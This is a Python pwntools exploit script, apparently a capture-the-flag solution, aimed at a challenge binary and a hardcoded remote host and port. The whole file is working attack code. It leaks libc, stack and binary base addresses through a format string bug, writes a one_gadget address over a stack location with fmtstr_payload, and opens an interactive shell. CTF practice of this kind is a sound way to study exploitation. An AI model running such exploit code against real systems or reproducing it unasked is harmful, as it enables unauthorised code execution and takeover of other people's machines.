#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '103.127.132.106', 9001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    # for i in range(50):
    #     io.sendline(f"%{i}$p".encode())
    #     try:
    #         leak = int(io.recvline().strip(), 16)
    #         info(f"{i}: {hex(leak)}")
    #     except:
    #         pass
    
    offset = 6  

    io.sendline(b'%3$p')
    libc.address = int(io.recvline().strip(), 16) - 0x1145f2

    io.sendline(b'%40$p')
    stack = int(io.recvline().strip(), 16) - 0x1e4d0

    io.sendline(b'%47$p')
    elf.address = int(io.recvline().strip(), 16) - 0x12ae

    one_gadgets = [0x50a47, 0xebc81, 0xebc85, 0xebc88]
    where = (stack + 0x1e4b8)
    what = libc.address + one_gadgets[0]
    payload = fmtstr_payload(offset, {where: what})
    io.sendline(payload)
    
    sleep(0.5)
    io.sendline()

    info('elf base: %#x', elf.address)
    info('libc base: %#x', libc.address)
    info('stack base: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()